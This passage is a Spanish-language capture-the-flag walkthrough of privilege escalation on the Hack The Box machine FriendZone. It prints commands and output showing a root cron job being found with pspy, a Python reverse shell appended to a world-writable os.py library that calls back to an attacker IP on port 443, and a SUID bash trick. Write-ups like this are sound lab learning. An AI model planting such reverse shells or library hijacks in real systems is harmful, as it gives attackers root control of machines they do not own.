El script poco hace pero lo que si me llama la atención es el `import os` quizás podamos hacer un **Python Library Hijacking**. Supongo que este programa se ejecutará en un intervalo de tiempo -tarea cron-, ahora lo comprobaremos.

Usaré pspy64 para ver estas tareas y procesos que se realizan en el sistema. Me abro un servidor en python para pasar el **pspy64**.

```sh
❯ ls
 pspy64
❯ python3 -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
```

Y desde remoto -máquina FriendZone- en /tmp:

```sh
friend@FriendZone:/tmp$ wget http://10.10.14.23:9090/pspy64
--2024-03-22 18:10:07--  http://10.10.14.23:9090/pspy64
Connecting to 10.10.14.23:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                        100%[=================================================================================================>]   2.96M  3.78MB/s    in 0.8s    

2024-03-22 18:10:08 (3.78 MB/s) - ‘pspy64’ saved [3104768/3104768]

friend@FriendZone:/tmp$ ls
pspy64

# Añado permisos de ejecución:
friend@FriendZone:/tmp$ ls -l
total 3032
-rw-rw-r-- 1 friend friend 3104768 Mar 22 18:07 pspy64
friend@FriendZone:/tmp$ chmod +x pspy64
friend@FriendZone:/tmp$ ls -l
total 3032
-rwxrwxr-x 1 friend friend 3104768 Mar 22 18:07 pspy64
``` 

Lancemos la herramienta:

```sh
friend@FriendZone:/tmp$ ./pspy64

... SNIP ...
2024/03/22 18:13:35 CMD: UID=0     PID=2      | 
2024/03/22 18:13:35 CMD: UID=0     PID=1      | /sbin/init splash 
2024/03/22 18:14:01 CMD: UID=0     PID=17357  | /usr/bin/python /opt/server_admin/reporter.py 
2024/03/22 18:14:01 CMD: UID=0     PID=17356  | /bin/sh -c /opt/server_admin/reporter.py 
2024/03/22 18:14:01 CMD: UID=0     PID=17355  | /usr/sbin/CRON -f 
... SNIP ....
```

Confirmamos que es una tarea cron. 

### Python Library Hijacking

Muy parecido al Library Hijacking pero con librerias en Python. Piensa que os es un programa también os.py y se encuentra en algún lugar, a la hora de buscar las librerías en python también tienen un path:

```sh
❯ python
Python 2.7.2 (default, Mar 18 2024, 17:37:47) 
[GCC 10.2.1 20210110] on linux6
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> print sys.path
['', '/usr/local/lib/python2.7', '/usr/local/lib/python2.7/plat-linux6', '/usr/local/lib/python2.7/lib-tk', '/usr/local/lib/python2.7/lib-old', '/usr/local/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/site-packages']
```

Cuando haces un import os, buscará esa librería dentro de esos directorios que hay en el path, primeramente empieza a buscar por el directorio actual de trabajo (comillas vacías), que **cuidadin**, no puedes meter la librería en nuestro directorio actual y que funcione esta vez, ya que lo está ejecutando root con su sesión. Si ese programa corriera con prvilegios de sudo para mi o SUID entonces si podríamos meter un archivo que se llamará igual en mi directorio actual y como estoy ejecutando el binario como root si que usaría mi path y funcionaría.  
Pero se puede hacer otra cosa si tenemos permisos de escritura en esa libreria que importa.

```sh
friend@FriendZone:/dev/shm$ locate os.py
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
/usr/lib/python2.7/encodings/palmos.py
/usr/lib/python2.7/encodings/palmos.pyc
/usr/lib/python3/dist-packages/LanguageSelector/macros.py
/usr/lib/python3.6/os.py
/usr/lib/python3.6/encodings/palmos.py

# En el primero que busca después del directorio actual de la sesión de root es en /usr/lib/python2.7
friend@FriendZone:/dev/shm$ cd /usr/lib/python2.7
friend@FriendZone:/usr/lib/python2.7$ find -type f -writable -ls
    20473     28 -rwxrwxrwx   1 root     root        26119 Mar 21 15:47 ./os.py
```
Parece que tenemos permiso de escritura en la libreria que importa, que seguramente la importará de ahí (es la segunda en orden después de carpeta actual de sesión de root). Puedo añadir lo que quiera y se ejecutará cuando lo importe con la tarea cron. Normalmente al final añado una línea como esta `system ("chmod 4755 /bin/bash")`, para tener permiso de SUID a la bash -no face falta que le añada el os.system ya que estoy en el propio os-. Pero en este caso parece existir una reverse shell de python al final del os, así que aprovecho:

```sh
friend@FriendZone:/usr/lib/python2.7$ nano os.py

... SNIP ....
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.2",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```

Cambio la IP a mi IP de la tun0 y cierro con **s.close()**:

```sh
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.23",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
s.close()
``` 

Me pongo en escucha.

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.123] 41554
root@FriendZone:~# whoami
whoami
root
root@FriendZone:~# cat /root/root.txt
cat /root/root.txt
6156e79cb9872125a0814******
```

Máquina muy chula. Se aprenden y repasan cosicas, y sobretodo prácticamos, importante para coger soltura.
